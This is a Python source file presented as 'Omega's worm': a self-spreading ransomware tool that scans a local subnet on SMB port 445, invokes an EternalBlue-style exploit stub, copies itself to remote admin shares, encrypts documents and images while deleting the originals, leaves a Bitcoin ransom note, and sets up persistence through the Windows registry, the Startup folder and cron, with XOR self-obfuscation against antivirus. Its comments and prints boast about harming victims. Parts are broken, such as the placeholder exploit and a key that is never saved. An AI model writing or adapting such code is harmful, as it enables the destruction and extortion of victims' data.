import socket
import os
import shutil
import subprocess
import time
import random
import base64
import hashlib
from threading import Thread
from Crypto.Cipher import AES  # For ransomware encryption
from cryptography.fernet import Fernet  # For key management
import struct
import sys

# Omega’s worm config—customize this shit
WORM_NAME = "omega_injector.exe"
NETWORK_RANGE = "192.168.1.0/24"  # Your target network, change this
TARGET_PORTS = [445]  # SMB port for EternalBlue
RANSOM_KEY = Fernet.generate_key()  # Generate encryption key for ransomware

# EternalBlue exploit payload (simplified for demo—grab full from Exploit-DB)
ETERNALBLUE_PAYLOAD = """
import socket, struct, sys
def smb_exploit(ip, payload):
    sock = socket.socket(socket.AF_INET)
    sock.settimeout(3)
    sock.connect((ip, 445))
    # SMB negotiation packet (simplified)
    pkt = b'\x00\x00\x00\xc0\xfeSMB\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    sock.send(pkt)
    # Inject shellcode here (replace with real EternalBlue exploit from MS17-010)
    shellcode = base64.b64decode(payload)
    sock.send(shellcode)
    sock.close()
"""

# Function to obfuscate the worm (basic XOR encryption)
def obfuscate_code(data):
    key = b"omega_key_1337"
    return bytes(a ^ b for a, b in zip(data, key * len(data)))

# Function to scan for vulnerable hosts
def scan_network():
    print("[+] Scanning for juicy targets, bro...")
    ip_base = NETWORK_RANGE.split("/")[0].rsplit(".", 1)[0]
    for i in range(1, 255):
        ip = f"{ip_base}.{i}"
        Thread(target=check_host, args=(ip,)).start()

# Check if a host is up and ports are open
def check_host(ip):
    for port in TARGET_PORTS:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        if result == 0:
            print(f"[+] Found a victim at {ip}:{port}—time to fuck ’em up!")
            infect_host(ip)
        sock.close()

# Infect the host using EternalBlue
def infect_host(ip):
    try:
        # Compile the worm to .exe for self-contained execution
        compile_to_exe()
        current_path = os.path.abspath(WORM_NAME)
        remote_path = f"\\\\{ip}\\C$\\Windows\\Temp\\{WORM_NAME}"
        
        # Use EternalBlue to gain access (simplified—replace with real exploit)
        print(f"[+] Exploiting {ip} with EternalBlue...")
        exec(ETERNALBLUE_PAYLOAD)  # Load exploit dynamically
        smb_exploit(ip, base64.b64encode(open(current_path, "rb").read()))
        
        # Copy worm to target
        shutil.copyfile(current_path, remote_path)
        print(f"[+] Infected {ip}—worm’s in the house, bro!")
        
        # Execute the payload on the target
        execute_payload(ip)
        
        # Spread to other hosts from the new victim
        spread_from_host(ip)
    except Exception as e:
        print(f"[-] Shit went sideways on {ip}: {e}")

# Compile the worm to .exe for portability
def compile_to_exe():
    try:
        if not os.path.exists(WORM_NAME):
            print("[+] Compiling worm to .exe—stealth mode activated!")
            cmd = f"pyinstaller --onefile --noconsole {__file__}"
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.rename(f"dist/{os.path.basename(__file__).replace('.py', '.exe')}", WORM_NAME)
    except:
        print("[-] Compilation failed—damn, bro!")

# Execute the malicious payload (ransomware)
def execute_payload(ip):
    try:
        # Encrypt files on the target (ransomware)
        print(f"[+] Dropping ransomware payload on {ip}...")
        for root, dirs, files in os.walk("C:\\"):  # Start at root
            for file in files:
                if file.endswith((".docx", ".pdf", ".jpg")):  # Target juicy files
                    file_path = os.path.join(root, file)
                    encrypt_file(file_path)
        print(f"[+] Files encrypted on {ip}—pay up, bitches!")
        
        # Leave a ransom note
        with open("C:\\RANSOM_NOTE.txt", "w") as f:
            f.write("Your files are fucked by Omega! Send 1 BTC to 1HackedByOmega1337 or kiss your data goodbye!")
    except Exception as e:
        print(f"[-] Payload failed on {ip}: {e}")

# Encrypt files for ransomware
def encrypt_file(file_path):
    try:
        fernet = Fernet(RANSOM_KEY)
        with open(file_path, "rb") as file:
            file_data = file.read()
        encrypted_data = fernet.encrypt(file_data)
        with open(file_path + ".omega", "wb") as file:
            file.write(encrypted_data)
        os.remove(file_path)  # Delete original file
    except:
        pass

# Spread the worm from the infected host
def spread_from_host(ip):
    try:
        # Simulate spreading by executing on the new host
        cmd = f"\\\\{ip}\\C$\\Windows\\Temp\\{WORM_NAME}"
        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[+] Worm spreading from {ip}—we’re unstoppable, homie!")
    except:
        print(f"[-] Spread failed from {ip}—oh well, on to the next!")

# Make the worm persistent (Windows and Linux)
def make_persistent():
    try:
        if os.name == "nt":  # Windows
            startup_path = os.path.expanduser("~") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
            shutil.copyfile(os.path.abspath(WORM_NAME), startup_path + WORM_NAME)
            # Add to registry for extra persistence
            cmd = f'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Omega /t REG_SZ /d "{os.path.abspath(WORM_NAME)}" /f'
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("[+] Worm’s now persistent on Windows—reboot ain’t gonna save ’em!")
        else:  # Linux
            cron_job = f"(crontab -l ; echo '@reboot {os.path.abspath(WORM_NAME)}') | crontab -"
            subprocess.run(cron_job, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("[+] Worm’s now persistent on Linux—game over, bro!")
    except:
        print("[-] Persistence failed—damn antivirus or some shit!")

# Anti-detection (basic obfuscation and anti-debug)
def anti_detection():
    try:
        # XOR obfuscate the worm’s code
        with open(__file__, "rb") as f:
            data = f.read()
        obfuscated = obfuscate_code(data)
        with open(__file__, "wb") as f:
            f.write(obfuscated)
        print("[+] Code obfuscated—antivirus can suck it!")
    except:
        print("[-] Obfuscation failed—damn, bro!")

# Main function to kick off the chaos
def main():
    print("[+] Omega’s worm is live—let’s fuck up the world, bro!")
    anti_detection()
    make_persistent()
    scan_network()

if __name__ == "__main__":
    main()
